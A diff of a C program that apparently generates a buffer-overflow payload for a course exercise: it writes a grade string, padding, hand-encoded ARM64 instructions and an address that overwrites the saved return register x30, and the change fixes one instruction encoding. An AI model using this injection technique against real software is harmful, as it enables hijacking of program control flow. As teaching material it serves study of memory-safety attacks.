@@ -9,7 +9,7 @@ int main(void)
     unsigned int uiData4;
 
     ulData1 = 0x420068; /* address to the instructions below; */
-    uiData2 = 0x528001E1; /* mov w1, #0x0A */
+    uiData2 = 0x52800141; /* mov w1, #0x0A */
     uiData3 = 0x10000040; /* adr x0, 0x420074 */
     uiData4 = 0x17FF8201; /* b 0x400874 */
 
@@ -30,7 +30,6 @@ int main(void)
     fprintf(psFile, "A+ is your grade.");
     fprintf(psFile, "%c", '%');
     fprintf(psFile, "%c", 'c');
-    /* buf[47] */
     fprintf(psFile, "%c", '\0');
     /* buf[48-55] (x30) */
     fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
